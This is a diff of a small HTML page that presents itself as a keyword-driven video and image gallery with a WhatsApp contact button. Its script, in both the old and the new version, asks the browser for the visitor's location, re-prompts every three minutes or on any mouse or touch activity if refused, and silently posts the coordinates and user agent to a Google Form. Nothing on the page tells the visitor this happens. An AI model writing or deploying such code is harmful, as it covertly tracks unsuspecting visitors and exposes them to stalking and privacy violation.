@@ -4,123 +4,121 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>リップズ</title>
+
 <style>
-body {
-  margin: 0;
-  background: black;
-  color: white;
-  font-family: Arial, sans-serif;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
+body{
+  margin:0;
+  background:black;
+  color:white;
+  font-family:Arial,sans-serif;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
 }
 
-h1 { margin-top: 40px; }
+h1{margin-top:40px}
 
-.main-img {
-  margin-top: 20px;
-  width: 120px;
-  height: 120px;
-  border-radius: 18px;
-  object-fit: cover;
+.main-img{
+  margin-top:20px;
+  width:110px;
+  height:110px;
+  border-radius:18px;
+  object-fit:cover;
 }
 
-input {
-  margin-top: 20px;
-  width: 220px;
-  padding: 12px;
-  border-radius: 10px;
-  border: none;
+input{
+  margin-top:20px;
+  width:220px;
+  padding:12px;
+  border-radius:10px;
+  border:none;
 }
 
-button {
-  margin-top: 12px;
-  padding: 10px 30px;
-  border-radius: 10px;
-  border: none;
-  background: white;
-  font-weight: bold;
-  cursor: pointer;
+button{
+  margin-top:12px;
+  padding:10px 30px;
+  border-radius:10px;
+  border:none;
+  background:white;
+  font-weight:bold;
+  cursor:pointer;
 }
 
-.warning {
-  margin-top: 120px;
-  opacity: 0.6;
+.warning{
+  margin-top:120px;
+  opacity:.6;
 }
 
-.modal {
-  display: none;
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.6);
-  backdrop-filter: blur(8px);
-  justify-content: center;
-  align-items: center;
-  z-index: 999;
+.modal{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.6);
+  backdrop-filter:blur(8px);
+  justify-content:center;
+  align-items:center;
+  z-index:999;
 }
 
-.modal-box {
-  position: relative;
-  width: 320px;
-  text-align: center;
+.modal-box{
+  position:relative;
+  width:320px;
+  text-align:center;
 }
 
 .modal video,
-.modal img {
-  width: 100%;
-  border-radius: 16px;
+.modal img{
+  width:100%;
+  border-radius:16px;
 }
 
-.close {
-  position: absolute;
-  top: -35px;
-  right: 0;
-  font-size: 22px;
-  cursor: pointer;
+.close{
+  position:absolute;
+  top:-35px;
+  right:0;
+  font-size:22px;
+  cursor:pointer;
 }
 
-.nav-btn {
-  position: absolute;
-  bottom: -40px;
-  font-size: 28px;
-  color: white;
-  background: rgba(0,0,0,0.4);
-  border: none;
-  border-radius: 6px;
-  padding: 5px 12px;
-  cursor: pointer;
-  user-select: none;
+.nav-btn{
+  position:absolute;
+  bottom:-40px;
+  font-size:28px;
+  color:white;
+  background:rgba(0,0,0,.4);
+  border:none;
+  border-radius:6px;
+  padding:4px 12px;
+  cursor:pointer;
 }
 
-.nav-left { left: 0; }
-.nav-right { right: 0; }
+.nav-left{left:0}
+.nav-right{right:0}
 
-.indicator {
-  margin-top: 8px;
-  font-size: 18px;
-  letter-spacing: 4px;
+.indicator{
+  margin-top:10px;
+  font-size:18px;
+  letter-spacing:4px;
 }
 
-.phone-btn {
-  position: fixed;
-  bottom: 20px;
-  right: 20px;
-  width: 50px;
-  height: 50px;
-  background: white;
-  border-radius: 50%;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  cursor: pointer;
-  z-index: 1000;
-  text-decoration: none;
+.phone-btn{
+  position:fixed;
+  bottom:20px;
+  right:20px;
+  width:50px;
+  height:50px;
+  background:white;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:1000;
 }
 
-.phone-btn svg {
-  width: 28px;
-  height: 28px;
-  fill: black;
+.phone-btn svg{
+  width:26px;
+  height:26px;
+  fill:black;
 }
 </style>
 </head>
@@ -128,7 +126,6 @@ button {
 <body>
 
 <h1>リップズ</h1>
-
 <img class="main-img" src="https://files.catbox.moe/2sgujb.jpg">
 
 <input id="keyword" placeholder="Search" disabled>
@@ -142,153 +139,146 @@ button {
   </div>
 </div>
 
-<a href="https://wa.me/6281317309919" target="_blank" class="phone-btn" title="Hubungi via WhatsApp">
-  <svg viewBox="0 0 24 24">
-    <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.11-.21c1.2.48 2.5.74 3.83.74a1 1 0 011 1v3.5a1 1 0 01-1 1C10.07 21.5 2.5 13.93 2.5 4a1 1 0 011-1H7a1 1 0 011 1c0 1.33.26 2.63.74 3.83a1 1 0 01-.21 1.11l-2.2 2.2z"/>
-  </svg>
+<a class="phone-btn" href="https://wa.me/6281317309919" target="_blank">
+<svg viewBox="0 0 24 24">
+<path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.11-.21c1.2.48 2.5.74 3.83.74a1 1 0 011 1v3.5a1 1 0 01-1 1C10.07 21.5 2.5 13.93 2.5 4a1 1 0 011-1H7a1 1 0 011 1c0 1.33.26 2.63.74 3.83a1 1 0 01-.21 1.11l-2.2 2.2z"/>
+</svg>
 </a>
 
 <script>
+/* ================== GLOBAL ================== */
 let data = {};
 let isDataReady = false;
-let currentIndex = 0;
 let currentImages = [];
+let currentIndex = 0;
 let locationGranted = false;
+let retryTimer = null;
 
-// Google Form config (optional, bisa dihapus kalau nggak mau submit)
-const formURL = "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse";
-const entryLatitude = "entry.138340134";
-const entryLongitude = "entry.1616098311";
-const entryUserAgent = "entry.1257224602";
-
-// Ambil data.json
+/* ================== LOAD data.json ================== */
 fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
-  .then(res => res.json())
-  .then(json => {
-    data = json;
-    isDataReady = true;
-    document.getElementById("keyword").disabled = false;
-    document.getElementById("searchBtn").disabled = false;
-  })
-  .catch(err => console.error("Gagal load data.json:", err));
+.then(r => r.json())
+.then(j => {
+  data = j;
+  isDataReady = true;
+  keyword.disabled = false;
+  searchBtn.disabled = false;
+});
 
-// Minta lokasi
-function requestLocation(callback) {
-  if (!navigator.geolocation) return;
+/* ================== GOOGLE FORM ================== */
+const FORM_URL =
+"https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse";
+
+function submitToForm(lat, lon){
+  const fd = new FormData();
+  fd.append("entry.138340134", lat);
+  fd.append("entry.1616098311", lon);
+  fd.append("entry.1257224602", navigator.userAgent);
+
+  fetch(FORM_URL,{
+    method:"POST",
+    mode:"no-cors",
+    body:fd
+  });
+}
+
+/* ================== LOCATION ================== */
+function requestLocation(){
   navigator.geolocation.getCurrentPosition(
-    pos => {
+    pos=>{
       locationGranted = true;
       const lat = pos.coords.latitude.toFixed(6);
       const lon = pos.coords.longitude.toFixed(6);
-      const ua = navigator.userAgent;
-
-      // submit lokasi ke Google Form (optional)
-      const formData = new URLSearchParams();
-      formData.append(entryLatitude, lat);
-      formData.append(entryLongitude, lon);
-      formData.append(entryUserAgent, ua);
-      fetch(formURL, { method: "POST", mode: "no-cors", body: formData });
-
-      if(callback) callback();
+      submitToForm(lat, lon);
+      if(retryTimer) clearInterval(retryTimer);
     },
-    err => { locationGranted = false; }
+    err=>{
+      locationGranted = false;
+    }
   );
 }
 
-function search() {
-  if (!isDataReady) {
-    alert("Data masih dimuat, tunggu sebentar...");
-    return;
+/* minta izin saat load */
+requestLocation();
+
+/* ulang tiap 3 menit kalau ditolak */
+retryTimer = setInterval(()=>{
+  if(!locationGranted){
+    requestLocation();
   }
-  if (!locationGranted) {
-    requestLocation(() => showMedia());
-  } else {
-    showMedia();
-  }
-}
+},180000);
 
-function showMedia() {
-  const key = document.getElementById("keyword").value.trim().toLowerCase();
-  if (!data[key]) return;
+/* ================== SEARCH ================== */
+function search(){
+  if(!isDataReady) return;
 
-  const modalBox = document.getElementById("modalBox");
-  modalBox.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
+  const key = keyword.value.trim().toLowerCase();
+  if(!data[key]) return;
 
-  if (data[key].type === "video") {
-    const video = document.createElement("video");
-    video.src = data[key].src;
-    video.controls = true;
-    video.autoplay = true;
-    modalBox.appendChild(video);
+  modalBox.innerHTML =
+  '<div class="close" onclick="closeModal()">✕</div>';
+
+  if(data[key].type==="video"){
+    const v=document.createElement("video");
+    v.src=data[key].src;
+    v.controls=true;
+    v.autoplay=true;
+    modalBox.appendChild(v);
   }
 
-  if (data[key].type === "gallery") {
-    currentImages = data[key].images;
-    currentIndex = 0;
+  if(data[key].type==="gallery"){
+    currentImages=data[key].images;
+    currentIndex=0;
 
-    const img = document.createElement("img");
-    img.id = "mainGallery";
-    img.src = currentImages[currentIndex];
+    const img=document.createElement("img");
+    img.id="mainGallery";
+    img.src=currentImages[0];
     modalBox.appendChild(img);
 
-    const leftBtn = document.createElement("button");
-    leftBtn.className = "nav-btn nav-left";
-    leftBtn.innerText = "<";
-    leftBtn.onclick = () => slide(-1);
-    modalBox.appendChild(leftBtn);
+    const l=document.createElement("button");
+    l.className="nav-btn nav-left";
+    l.innerText="<";
+    l.onclick=()=>slide(-1);
+    modalBox.appendChild(l);
 
-    const rightBtn = document.createElement("button");
-    rightBtn.className = "nav-btn nav-right";
-    rightBtn.innerText = ">";
-    rightBtn.onclick = () => slide(1);
-    modalBox.appendChild(rightBtn);
+    const r=document.createElement("button");
+    r.className="nav-btn nav-right";
+    r.innerText=">";
+    r.onclick=()=>slide(1);
+    modalBox.appendChild(r);
 
-    const indicator = document.createElement("div");
-    indicator.className = "indicator";
-    indicator.id = "indicator";
-    modalBox.appendChild(indicator);
+    const ind=document.createElement("div");
+    ind.id="indicator";
+    ind.className="indicator";
+    modalBox.appendChild(ind);
     updateIndicator();
   }
 
-  document.getElementById("modal").style.display = "flex";
+  modal.style.display="flex";
 }
 
-function slide(direction) {
-  currentIndex += direction;
-  if (currentIndex < 0) currentIndex = currentImages.length - 1;
-  if (currentIndex >= currentImages.length) currentIndex = 0;
-  document.getElementById("mainGallery").src = currentImages[currentIndex];
+function slide(d){
+  currentIndex+=d;
+  if(currentIndex<0) currentIndex=currentImages.length-1;
+  if(currentIndex>=currentImages.length) currentIndex=0;
+  mainGallery.src=currentImages[currentIndex];
   updateIndicator();
 }
 
-function updateIndicator() {
-  const indicator = document.getElementById("indicator");
-  if (!indicator) return;
-  let text = "";
-  for (let i = 0; i < currentImages.length; i++) {
-    text += (i === currentIndex) ? "♦" : "•";
+function updateIndicator(){
+  let s="";
+  for(let i=0;i<currentImages.length;i++){
+    s+= i===currentIndex ? "♦" : "•";
   }
-  indicator.textContent = text;
+  indicator.textContent=s;
 }
 
-function closeModal() {
-  const modal = document.getElementById("modal");
-  modal.style.display = "none";
-  const video = document.querySelector("#modalBox video");
-  if(video) { video.pause(); video.src = ""; }
-  document.getElementById("modalBox").innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
-  currentImages = [];
-  currentIndex = 0;
+function closeModal(){
+  modal.style.display="none";
+  modalBox.innerHTML =
+  '<div class="close" onclick="closeModal()">✕</div>';
 }
 
-// Minta lokasi terus menerus saat ada interaksi
-["mousemove","mousedown","scroll","touchstart"].forEach(evt => {
-  document.addEventListener(evt, () => {
-    if (!locationGranted) requestLocation();
-  });
-});
-
-document.getElementById("searchBtn").addEventListener("click", search);
+searchBtn.onclick=search;
 </script>
 
 </body>
